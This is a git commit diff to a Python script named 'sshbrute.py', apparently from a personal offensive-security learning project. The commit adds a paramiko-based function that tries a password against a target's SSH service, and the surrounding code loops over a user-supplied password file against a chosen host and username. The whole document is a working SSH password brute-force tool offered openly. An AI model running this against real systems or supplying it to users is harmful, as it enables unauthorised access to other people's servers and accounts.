dea02c6fefdfdd00e94798c6e81d9aa89a3aa424
Kali machine <yelionel26@gmail.com>
2022-10-26 17:06:42 -0400

    Automating SSH connection

--- sshbruteforce/sshbrute.py
+++ sshbruteforce/sshbrute.py
@@ -4,6 +4,22 @@ import os
 import socket
 import termcolor
 
+
+def ssh_connect(password, code=0):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        ssh.connect(host, port=22, username=username, password=password)
+    except paramiko.AuthenticationException:
+        code = 1
+    except socket.error as e:
+        code = 2
+
+    ssh.close()
+    return code
+
+
 host = input('[+] Target address: ')
 username = input('[+] SSH username: ')
 input_file = input('[+] Passwords file: ')
@@ -16,4 +32,4 @@ with open(input_file, 'r') as file:
     for line in file.readlines():
         password = line.strip()
         try:
-            ssh_connect(password)
+            response = ssh_connect(password)
